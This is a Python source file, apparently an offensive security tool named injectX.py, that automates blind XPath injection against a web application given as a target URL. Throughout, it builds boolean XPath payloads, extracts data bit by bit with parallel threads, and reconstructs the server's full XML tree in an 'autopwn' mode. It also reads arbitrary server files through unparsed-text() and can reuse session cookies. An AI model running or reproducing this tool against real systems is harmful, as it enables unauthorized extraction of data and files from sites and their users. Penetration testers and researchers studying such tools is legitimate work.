#!/usr/bin/env python3
#
# injectX.py
#
# Interesting optimization techniques for data extraction through XPath injections
#
# at the moment xcat has a lot of bugs so I wrote my own tool to be able to extract
# arbitrary files from the server
#
# written by Ruben Piña [tr3w]
# twitter: @tr3w_
# http://nzt-48.org
# 
#

import sys
import string
import requests
import hashlib
import time
import argparse
import threading
from math import ceil

binstr = 0x00000000
request = 0x00

def pwn(injection):
    global cookie
    global cookies
    if cookies == {} :
        if cookie:
            cookie = cookie.split('=') or cookie
            if not len(cookie) % 2:
                for i in range(0, len(cookie), 2):
                    cookies[cookie[i]] = cookie[i+1]
            else:
                sys.stdout.write('[x] Malformed cookie.\n')
                exit()
          
    url = target + str(injection)
    url = url.replace(' ', '+')
    r = requests.get(url, cookies=cookies)
    data = r.text
    global use_hashes
    global hashes
    global true_string
    global request
    request += 0x01
 
    if use_hashes:
        result = hashlib.md5(data.encode('utf-8')).hexdigest()
        if len(hashes) < 2:
            return result
        else:
            if result in hashes[0x01]:
                return 0x01
            else:
                return 0x00
    else:
        return 1 if true_string in data.encode('utf-8') else 0

def get_hashes():
    
    global hashes
    global tid
    
    null = pwn('0/0')
    hashes.append(null)
    if not tid:
        i = 0x01
        while 0x01:
            guess = pwn(i)
            if guess != null:
                hashes.append(guess)
                tid = i
                break
            i += 0x01
    else:
        hashes.append(pwn(tid))


def get_length():

    global node
    global length_binary
    length_binary = 0x00
    global length_of_length_binary
    length_of_length_binary = 0x00


    if not '/text()' in node:
        if check_name():
            return node

    # check if its zero
    if 'count' in node:
        injection = "%d' and (%s mod 128) and '1" % (tid, node)
    else:
        injection = "%d' and (string-length(normalize-space(string(%s))) mod 128) and '1'='1" % (tid, node)
    
    result = pwn(injection)
    
    if not result:
        return 0x00


    
    def length_of_length(bit):
    
        global length_of_length_binary
        injection = "%d' and (floor((string-length(string(string-length(normalize-space(string(%s)))))) div %d) mod 2) and '1'='1" % (tid, node, bit)
        r = pwn(injection)
        if r:
            length_of_length_binary = length_of_length_binary | bit
            

    def binary_length(index, bit):
        global length_binary
        injection = "%d' and (floor((number(substring(string(string-length(normalize-space(string(%s)))),%d,1)))div %d)mod 2) and  '1" % (tid, node, index, bit)
        r = pwn(injection)
        if r:
            length_binary = length_binary | bit
       

    l1 = threading.Thread(target = length_of_length, args = (0x01, ))
    l2 = threading.Thread(target = length_of_length ,args = (0x02, ))
    l3 = threading.Thread(target = length_of_length, args = (0x04, ))
    l4 = threading.Thread(target = length_of_length, args = (0x08, ))


    l1.start()
    l2.start()
    l3.start()
    l4.start()


    l1.join()
    l2.join()
    l3.join()
    l4.join()

    size = ''
    
    for index in range(1, length_of_length_binary + 1):
    
        l1 = threading.Thread(target = binary_length, args = (index, 0x01, ))
        l2 = threading.Thread(target = binary_length, args = (index, 0x02, ))
        l3 = threading.Thread(target = binary_length, args = (index, 0x04, ))
        l4 = threading.Thread(target = binary_length, args = (index, 0x08, ))
 
        l1.start()
        l2.start()
        l3.start()
        l4.start()

        l1.join()
        l2.join()
        l3.join()
        l4.join()
        
        size = size +  str(length_binary)
        length_binary = 0x00

    return int(size)


def check_name():

    global node_names
    global last
    

    for n in node_names:
        injection = "%d' and %s='%s" % (tid, node, n)
        result = pwn(injection)
        bit = 1 if result else 0

        if bit:
            last = n
            return n

    return 0x00

def inject(index, i):

    global hashes
    global use_hashes
    global tid
    global node
    
    injection = "%d' and (floor(string-to-codepoints(substring(%s,%d,1))div %d) mod 2) and '1'='1" % (tid, node, index, i);
    result = pwn(injection)

    bit = 0
    bit = 1 if result else 0
               
    global binstr
    if bit:
        binstr = binstr | i

    return 0x01


def aut0pwn():
    
    global node
    global nodes
    parent_nodes = []
    
    node = "name(root(/*)/*)"
    length = get_length()
    root_node = start(length)
    sys.stdout.write('>')
    parent_nodes.append(root_node)


    i = 0x01   # node counter
    j = 0x00   # tab format counter
    popout = 0x01
    
    while 0x01:
       
        # look if there's text in the node
        node = '((/%s/descendant::*)[%d])/text()' % (root_node, i)
        text_node = get_length()
        
        
        node = 'name((/%s/descendant::*)[%d])' % (root_node, i)
        fnode_length = get_length()
        

        if fnode_length:
            j += 1
            sys.stdout.write("\n" + "\t" * j)
            parent_nodes.append(start(fnode_length))
            node = 'name((//%s/descendant::*)[%d]/attribute::*)' % (root_node, i)
            fnode_length = get_length()
            if fnode_length:
                sys.stdout.write(' ')
                start(fnode_length)
                sys.stdout.write('=\'')
                node = '(//%s/descendant::*)[%d]/attribute::*' % (root_node, i)
                fnode_length = get_length()
                start(fnode_length)
                sys.stdout.write('\'')
            
            sys.stdout.write('>')
        
            
            # does the node contain text?
            if text_node:
                j = j & 0xfffe # no identation
                # print text
                node = '((/%s/descendant::*)[%d])/text()' % (root_node, i)
                fnode_length = get_length()
                start(fnode_length)
                sys.stdout.write('</%s>' % parent_nodes.pop())
              
            
            node = 'count(((/%s/descendant::*)[%d]/following-sibling::*)[1])' % (root_node, i)
            siblings = get_length()

            node = 'count((/%s/descendant::*)[%d]/(child::*)[1])' % (root_node, i)
            childs = get_length()

            i += 0x01
            
            # there are childs, enumerate them
            if childs:
                if not siblings:
                    popout += 0x01
                continue

            # there are siblings: enumerate sibling
            if siblings:
                continue
            
            # no sibling, decrease identation and close parent tag
            j = j & 0xfffe
            for l in range(0, popout):
                sys.stdout.write('\n' + '\t' * j)
                sys.stdout.write('</%s>' % parent_nodes.pop())
                j -= 1
                popout = popout - 1 if l else  popout
            else:
                if not len(parent_nodes):
                    return 
            
            continue


def extract_file():
    global filename
    global node
    
    node = "unparsed-text('%s')" % filename
    file_length = get_length()
    file_content = start(file_length)

def start(length):

    global last
    global t1
    global t2
    global t3
    global t4
    global t5
    global t6
    global t7
    global t8
    global node_names
    global nodes
    global node
    request = 0x00
    r = ''
    
    
    braces = 1 if '/text()' not in  node  and 'attribute' not in node and 'unparsed-text' not in node else 0
    if braces:
        sys.stdout.write('<')
        
        
    if last != '':
        l = last
        last = ''
        sys.stdout.write('%s' % l )
        return l
    


    for index in range(1, length + 1):


        t1 = threading.Thread(target = inject, args = (index, 0x01,))
        t2 = threading.Thread(target = inject, args = (index, 0x02,))
        t3 = threading.Thread(target = inject, args = (index, 0x04,))
        t4 = threading.Thread(target = inject, args = (index, 0x08,))
        t5 = threading.Thread(target = inject, args = (index, 0x10,))
        t6 = threading.Thread(target = inject, args = (index, 0x20,))
        t7 = threading.Thread(target = inject, args = (index, 0x40,))         
        t8 = threading.Thread(target = inject, args = (index, 0x80,))
    
        global binstr
        binstr = 0x00

        t1.start()
        t2.start()
        t3.start()
        t4.start()
        t5.start()
        t6.start()
        t7.start()
        t8.start()
                


        t1.join()
        t2.join()
        t3.join()
        t4.join()
        t5.join()
        t6.join()
        t7.join()
        t8.join()
        
        
        sys.stdout.write(chr(binstr))
        sys.stdout.flush()
        r += chr(binstr)
        

    if braces:
        
        node_names.add(r)
        return r

    return r
    


parser = argparse.ArgumentParser(description="Blind XPath Injection data extraction tool.")
parser.add_argument('-i','--trueid',    default = 1,    type=int,
        help = 'id of the page when result is true (default: %(default)s)')
parser.add_argument('-s','--string', default = '',
        help = 'Unique string found when result is true, omit to automatically use a signature')
parser.add_argument('-f','--file', default = '',
        help = 'File name to extract')
parser.add_argument('-k', '--cookie', default = '', type=str,
        help = "Session cookie")
parser.add_argument('-a', '--autopwn', action='store_true',
        help = 'autopwn!')
parser.add_argument('TARGET', help='The vulnerable URL. Example: http://vuln.com/page.php?id= ')
args = parser.parse_args()

autopwn = args.autopwn or 0
filename = args.file or 0
target    = args.TARGET
hashes = []
cookies = {}
cookie = args.cookie or ''
nodes = []
node = ''
node_names = set()
last = ''

use_hashes = 0x00
tid = args.trueid
if args.string:
    true_string = args.string
else:
    use_hashes = 0x01
    get_hashes()


timer =  time.strftime("%X")

if autopwn:
    aut0pwn()

if filename:
    extract_file()
   
sys.stdout.write("\n\n<!--\n")
sys.stdout.write("\n\n[+] Start Time: " + timer)
sys.stdout.write("\n[+] End Time:   " + time.strftime("%X"))
sys.stdout.write("\n[+] %d requests\n" % (request))
sys.stdout.write("\n[+] Done.\n") 
sys.stdout.write("-->\n")


